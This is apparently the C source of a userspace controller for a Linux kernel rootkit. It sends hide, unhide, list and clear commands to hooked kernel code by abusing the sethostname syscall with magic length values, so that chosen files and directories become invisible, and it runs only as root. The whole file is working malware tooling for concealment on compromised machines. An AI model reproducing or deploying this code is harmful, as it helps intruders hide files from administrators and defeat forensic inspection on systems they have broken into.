#define _USER_
#include <stdio.h>
#include <errno.h>
#include "def.h"

#define __NR_sethostname 74

syscall2(long, sethostname, char *, hostname, int, len);


void show_msg(const char *cmd)
{
	printf("\nUsage %s [-h] [-u] [-p] [-c] file_name/directory_name \n", cmd);
	printf("\n[-h] Hide the file/directory \n[-u] Unhide the file/directory \n[-p] Print the filter keywords \n[-c] Clear the filter keywords\n");
	printf("\nExample: (sudo) %s -h winona   \n\n", cmd);
	return ;
}

void check_error(int ret)
{
	switch(ret)
	{
		case NOERR:
			exit(0);
		case -NOMEM:
			printf("ERROR : Cannot allocate memory! [FATAL ERROR]\n");
			exit(-NOMEM);
		case -ACCERR:
			printf("ERROR : Cannot copy! [FATAL ERROR]\n");
			exit(-ACCERR);
		case -NOENT:
			printf("ERROR : No such file or directory! [-p print hidden list] \n");
			exit(-NOENT);
		case -LENOVER:
			printf("ERROR : Filename oversize!\n");
			exit(-LENOVER);
		case -SLOTFULL:
			printf("ERROR : Hide slot full! \n");
			exit(-SLOTFULL);
		case -UNKNOWN:
			printf("ERROR : Command not found!\n");
			exit(-UNKNOWN);
		default:
			printf("ERROR : Unknown error occurs!\n");
			exit(ret);
	}
}


int main(int argc, char *argv[])
{
	int ret;
	char *pos = NULL;
	char buffer[64];
	memset(buffer, 0x0, 64);

	if (argc < 2 || !(pos = argv[1]) || !(++pos))
	{
		show_msg(argv[0]);
		exit(-1);
	}

	if (getuid() || geteuid())
	{
		printf("ERROR : Need to be root\n");
		return 0;
	}

	setuid(UID);
	seteuid(EUID);

	switch(*pos)
	{
		case 'h':
			printf("[+]Hide File : %s\n", argv[2]);
			ret = sethostname(argv[2], HIDE_FILE);
			sleep(1);
			break;
		case 'u':
			printf("[+]Unhide File : %s\n", argv[2]);
			ret = sethostname(argv[2], UNHIDE_FIFE);
			sleep(1);
			break;
		case 'c':
			printf("[+]Clear Filter Keywords \n");
			sethostname("Clear", CLEAR_HIDE);
			sleep(1);
			break;
		case 'p':
			printf("[+]Show Filter Keywords : \n");
			sethostname(buffer, SHOW_HIDE);
			sleep(1);
			printf("%s\n", buffer);
			break;
		default :
			ret = -UNKNOWN;
			break;
	}
	check_error(ret);
	return 0;
}


